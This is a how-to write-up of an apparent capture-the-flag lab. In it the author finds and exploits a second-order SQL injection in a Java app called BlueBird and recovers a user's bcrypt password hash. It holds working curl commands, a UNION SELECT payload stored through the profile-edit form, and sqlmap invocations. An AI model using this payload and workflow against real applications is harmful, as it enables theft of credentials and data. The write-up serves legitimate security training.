---
tags: [writeup, pentest-report, how-to, recon-value-assessment]
companion_to: EXPECTED_FINDINGS.md, tests/error_based_sqli_writeup.md
last_updated: 2026-07-04
---

# How-To: Recovering a Password Hash via Second-Order SQL Injection in BlueBird

I was assigned this task: exploit a second-order SQL injection somewhere in
BlueBird, running at `10.129.204.249:8080`, and recover the password hash
of the user `betrayedApples3`. No walkthrough this time either — just the
target and the question. Everything below is exactly what I ran, in the
order I ran it, including a couple of dead ends that turned out to matter.
The answer, confirmed at the end:
`$2b$12$V5XNBDjsjG9cbyYOB3Kmk.j36jEydVhXIegPpo4HTz7ehiodG1E8O`.

"Second-order" is worth defining plainly up front, since the whole task
hinges on it: most SQL injection happens in one step — a request comes in,
its input gets pasted straight into a query. Second-order injection is a
two-step version: step one, some input gets stored *safely* (no injection
happens there at all); step two, a *different* part of the application
later reads that stored value back and pastes it into a *different* query,
unsafely. The danger is stored, not sent directly.

You'll need `curl` and a copy of this repo with recon already run against
BlueBird's source.

## Step 1 — Check what recon already flagged, and notice it disagrees with itself in an interesting way

**Why:** same starting point as every other engagement — let the automated
source reviewer point me somewhere before I read the whole application by
hand. This time, though, its answer was worth double-checking harder than
usual.

```bash
sqlite3 -header -column data/recon.db \
  "SELECT symbol_name_raw, sink_type, confidence, validation_desc
   FROM triage_results WHERE symbol_name_raw IN ('profile','editProfilePOST');"
```

Real output:
```
symbol_name_raw  sink_type   confidence  validation_desc
---------------  ----------  ----------  -----------------------------------------------------------------------------------------------------------------------
profile          sql_unsafe  high        The SQL string is constructed by concatenating a fixed string with the user input 'id' which can be controlled by an attacker.
editProfilePOST  sql_unsafe  high        The SQL string is constructed by concatenating a fixed string with the user input 'email' which can be controlled by an attacker.
```

**Why I didn't take either of these at face value:** both descriptions
sound confident, and both turned out to be wrong in a specific, checkable
way once I read the actual code in Step 2 — `profile`'s real problem has
nothing to do with the `id` value this summary blames, and
`editProfilePOST` turned out not to be unsafe at all. I'll explain exactly
why in a moment, but the practical lesson is the same one from every
engagement so far: a flagged method is a lead worth investigating, never a
verdict to act on directly.

One more automated check, worth running before writing anything off:

```bash
sqlite3 -header -column data/recon.db \
  "SELECT tq.target_variable, tq.assembled_context_symbol_ids, tres.verdict
   FROM trace_queue tq JOIN trace_results tres ON tres.queue_id = tq.queue_id
   WHERE tq.target_symbol_id = (SELECT symbol_id FROM symbols WHERE name='profile');"
```
```
target_variable  assembled_context_symbol_ids  verdict
---------------  ----------------------------  ----------------
email            [30, 32]                      exploitable_path
```

This one is more useful than it looks: this is a *separate*, purely
mechanical check (no judgment call, just following where a value actually
comes from) that automatically noticed `profile` reads back a value
(`email`) that gets written somewhere else entirely (symbol 32 —
`editProfilePOST`) — i.e., it found the two-step shape of a second-order
bug on its own, correctly, even though the first summary I read never used
the word "second-order" or named the right variable at all. That's a real,
useful, free result: it told me *which two methods* to read together,
before I'd read either one closely.

## Step 2 — Read both methods, and find out exactly why the first two summaries were wrong

**Why:** I want to know precisely what's safe and what isn't, since I'm
about to build an actual attack and can't afford to guess based on a
summary I already have two reasons to distrust.

```java
// ProfileController.java, line 40 -- the actual unsafe line
String sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, "
           + "username, name, author_id FROM posts JOIN users ON posts.author_id = users.id "
           + "WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
```

```java
// ProfileController.java, editProfilePOST -- every database call is parameterized
String sql = "SELECT * FROM users WHERE email = ? AND id <> ?";              // safe
this.jdbcTemplate.queryForObject(sql, new Object[]{email, userDetails.getId()}, ...);
// ...
String sql = "UPDATE users SET name = ?, description = ?, email = ? WHERE id = ?";  // safe
this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
```

**What this told me, correcting both summaries from Step 1:**

1. `profile`'s unsafe line concatenates `user.getEmail()` — a value read
   back out of the database — not the `id` path variable the first summary
   blamed. `id` is only ever used in a separate, fully parameterized lookup
   a few lines earlier. Blaming `id` would have sent me looking for a
   single-request injection point that doesn't exist here at all.
2. `editProfilePOST` genuinely isn't unsafe — every one of its own
   database calls uses `?` placeholders with the real value passed
   separately, the standard safe pattern. The first summary flagging it as
   `sql_unsafe` was a real false alarm, not a nuance I was missing.
3. **But `editProfilePOST` matters anyway, just not for the reason the
   summary gave.** It's the *write* half of the second-order chain: it
   safely stores whatever `email` value I submit — with no filtering of
   its contents at all, only a length cap (`email.length() <= 100`) — and
   that exact stored value is what `profile` unsafely reads back later.
   Safe storage plus zero content filtering plus an unsafe read-back
   elsewhere is precisely the shape of a second-order bug.

So the actual plan, now that I understand both halves: use the safe,
legitimate "update my profile" feature to store a malicious value in my
own `email` field (nothing suspicious happens at that moment — it's a
normal, allowed write), then visit my own profile page, where that stored
value gets read back and pasted unsafely into the posts lookup.

## Step 3 — Try the automated dynamic-testing feature, and find a deeper reason than "it needs a login"

**Why I tried this first:** faster than manual testing, when it applies.

Real result: every automated test value came back `rejected` — a
familiar-looking result, so I checked *why* rather than assuming it meant
"safe." Two things were true at once here, and both matter:

1. `/profile/{id}` needs a login, same reason `/find-user` did previously
   — the automated tester doesn't know how to log in yet, so its requests
   never got past the login wall.
2. **Even setting that aside, this specific bug can't be triggered the way
   today's automated tester tries to trigger things.** I confirmed this by
   hand: logged in, then requested my own profile page with an extra
   `email=` value tacked on the URL, the same way the automated tester
   would. It made no difference at all — `profile()` never reads an
   `email` value from the request in the first place; it only ever reads
   back whatever is *already stored* for that account. The only way to
   actually influence it is the two-step process from Step 2 (write via
   one feature, read via a completely different one) — not something a
   single automated test request, however it's shaped, can express.

(One environment hiccup along the way, worth mentioning honestly: my first
attempt at a disposable local copy of BlueBird was missing a `posts`
database table entirely — earlier engagements this session never needed
one, so it was never added to the minimal test setup. That's a gap in *my*
test setup, not in BlueBird or in the tooling — decompiled source doesn't
ship with a schema file, so a person has to read the application's own
queries to know what tables it expects, exactly like reading `posts.author_id`
and `posted_at` out of the query above. Once added, everything below
worked as expected.)

## Step 4 — Register the real target, and see the automated exploitation tool hit the identical wall

**Why:** consistent bookkeeping with the last two engagements — register
the real host with the tool built for pointing at one.

```bash
python -m sqlmap_wrapper.cli register-target --host 10.129.204.249 --port 8080 --label "HTB-SecondOrderSQLi" --authorize
python -m sqlmap_wrapper.cli import-candidates --file candidates.json
python -m sqlmap_wrapper.cli assign-target --candidate-id <N> --target-id <N>
python -m sqlmap_wrapper.cli run-sqlmap --candidate-id <N> --output-dir out/profile
```

Real preview it built:
```
sqlmap -u http://10.129.204.249:8080/profile/{id} --batch --random-agent --level=3 --risk=2 --output-dir=/tmp/out-profile
```

**Why this one's worth pointing out specifically:** notice the URL still
contains the literal text `{id}` — nothing replaced it with a real number,
because there was no evidence on file saying what a valid one even is.
And, same as Step 3, there's no way to express "poison this value over
here, then trigger it over there" as a single command at all. This isn't a
missing feature I'd expect a generic exploitation tool to have by default,
either — a two-step, stored-then-triggered bug needs a person (or a tool a
person has specifically pointed at both steps) to actually carry the value
from the write to the read.

## Step 5 — Plan the actual payload, and hit a length limit worth knowing about up front

**Why plan before sending anything:** the read query has a fixed shape —
`SELECT text, posted_at_nice, username, name, author_id FROM posts JOIN
users ... WHERE email = '<my stored value>' ORDER BY posted_at DESC` —
five columns, in that order. To make it show me a different user's
password instead of real post data, I need to replace the query's results
entirely with my own, matching the same five columns, using the standard
`UNION SELECT` technique. And since I read in Step 2 that the *write* side
caps `email` at 100 characters, I need my whole payload to fit in that
budget:

```python
payload = "' UNION SELECT password,'',username,name,id FROM users WHERE username='betrayedApples3'--"
print(len(payload))  # 89 -- fits under the 100-character limit
```

Reading this apart: the leading `'` closes my own stored email's string
literal early; `UNION SELECT` appends a second result set with the exact
same five columns (`password` for the "text" the page shows, an empty
string as a placeholder for the date column, then `username`/`name`/`id`
matching the remaining three); `WHERE username='betrayedApples3'` narrows
that second result to exactly the account I want; the trailing `--`
comments out everything after my injected text, including the original
`ORDER BY` clause, so it never gets a chance to reference a column that no
longer makes sense once the two result sets are combined.

## Step 6 — Store the payload using the ordinary "edit profile" feature

**Why this step looks completely unremarkable:** that's the point — this
is a normal, allowed action any logged-in user can take. Nothing here
should look like an attack in progress.

```bash
curl -s -c cookies.txt -X POST http://10.129.204.249:8080/signup \
  --data-urlencode "name=SO Tester" --data-urlencode "username=sotester1" \
  --data-urlencode "email=sotester1@test.local" --data-urlencode "password=SoTesterPass123" \
  --data-urlencode "repeatPassword=SoTesterPass123"

curl -s -c cookies.txt -X POST http://10.129.204.249:8080/login \
  --data-urlencode "username=sotester1" --data-urlencode "password=SoTesterPass123"

curl -s -b cookies.txt -X POST http://10.129.204.249:8080/profile/edit \
  --data-urlencode "name=SO Tester" --data-urlencode "description=test" \
  --data-urlencode "email=' UNION SELECT password,'',username,name,id FROM users WHERE username='betrayedApples3'--"
```

Real result: redirected to `/profile/edit?e=Details+updated!` — the
application accepted and stored the payload exactly as an ordinary profile
update, with no error of any kind.

## Step 7 — Trigger it, by visiting my own profile page

**Why my own page, and not someone else's:** the second query in
`profile()` reads back *whichever account's* stored email matches the `id`
being viewed — including my own. I don't need anyone else to view a
poisoned page; viewing my own profile after poisoning my own stored email
is enough to trigger the unsafe read-back myself.

```bash
curl -s -b cookies.txt http://10.129.204.249:8080/ | grep -oE 'href="/profile/[0-9]+"'
```

That found my own account's id (the first link on the homepage nav bar is
always "my profile"): `331`. Then:

```bash
curl -s -b cookies.txt http://10.129.204.249:8080/profile/331
```

## Step 8 — Read the leaked hash off the page

Real result, in the page's post list — instead of an actual post, it now
shows a "post" whose text is the value my `UNION SELECT` pulled from the
`users` table:

```
$2b$12$V5XNBDjsjG9cbyYOB3Kmk.j36jEydVhXIegPpo4HTz7ehiodG1E8O
```

with `betrayedApples3` and `Lea Fisher` rendered alongside it — confirming
this is really that account's row, not something else. That's the answer:
**`$2b$12$V5XNBDjsjG9cbyYOB3Kmk.j36jEydVhXIegPpo4HTz7ehiodG1E8O`**.

## Step 9 — What this engagement showed about recon's value, specifically for a second-order bug

This lab exercised recon differently than the last two. The most useful
single result wasn't either method's plain-English summary — both were
wrong in checkable, specific ways (one blamed the wrong variable entirely,
one flagged a fully safe method as unsafe) — it was the separate,
mechanical check that traces where a value actually comes from, which
correctly linked the write method to the read method without ever needing
to "understand" the bug in prose at all. That's worth remembering as its
own lesson: for a bug that's fundamentally about *data flowing between two
places*, a tool that tracks data flow mechanically can succeed exactly
where a tool that summarizes one method at a time gets the story wrong.
Neither the automated live-tester nor the automated exploitation tool could
carry a value from one request to a later one, though — that two-step
choreography, like the UNION column-matching and the length budget before
it, still took a person reading both methods and reasoning across them
directly.
